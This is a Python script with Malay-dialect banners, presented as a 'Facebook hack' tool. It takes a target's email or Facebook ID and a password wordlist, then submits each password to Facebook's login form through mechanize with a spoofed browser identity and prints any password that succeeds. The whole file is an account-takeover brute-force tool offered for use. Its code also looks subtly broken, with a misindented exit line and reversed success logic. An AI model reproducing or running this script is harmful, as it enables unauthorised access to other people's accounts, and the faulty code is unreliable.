#Buat Apa Mencuri Lagi Bagus Buat Sendiri 🙂


import sys
import random
import mechanize
from http import cookiejar

GHT = '''
       FACEBOOK HACK BY TEMUANCYBER
       
'''
print("NOTE => Hai Mamak , Terimak Kasih Gunak !")
print("Mamak Nak Hack Pesbuk Sapak ? ")
print ("⇶TEMUANCYBER") 
print ("Nak Keluar Tekan : ( ctrl + c ) ") 

email = input("# Masuk Email | Nombor Henpon | ID Pesbuk | Nama Pesbuk: ")
passwordlist = input("Masukkan password dekat sinin : ")

useragents = ['Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1']

login = 'https://www.facebook.com/login.php?login_attempt=1'

def attack(password):
    try:
        sys.stdout.write("\r[*] Tengah Terai nin %s.. " % password)
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr=0)
        br.form['email'] = email
        br.form['pass'] = password
        br.submit()
        log = br.geturl()
        if log == login:
            print("\n\n\n[*] Oh! Dah Jumpak !!!")
            print("[*] Paswed Diak: %s\n" % (password))
             sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] OTW Keluar...")
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n", ""))

def check():
    global br
    global passwords
    try:
        br = mechanize.Browser()
        cj = cookiejar.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
        print("\n[*] OTW Keluarlah...\n")
        sys.exit(1)
    try:
        password_file = open(passwordlist, "r")
        passwords = password_file.readlines()
        k = 0
        while k < len(passwords):
            passwords[k] = passwords[k].strip()
            k += 1
    except IOError:
        print("\n[*] Salah tuk mamak ai ? : Gunak (paswed.txt).\n")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Gusak program...\n")
        sys.exit(1)
    try:
        print(GHT.strip())
        print(" [*] Akaun Uwang : %s" % (email))
        print(" [*] Sabar duluk mamak !!! :", len(passwords), "passwords")
        print(" [*] Minum Duluk Extra Jozz Duluk!")
    except KeyboardInterrupt:
        print("\n[*] OTW Keluar...\n")
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print("\n[*] OTW Keluar...\n")
        sys.exit(1)

if __name__ == '__main__':
    check()




























































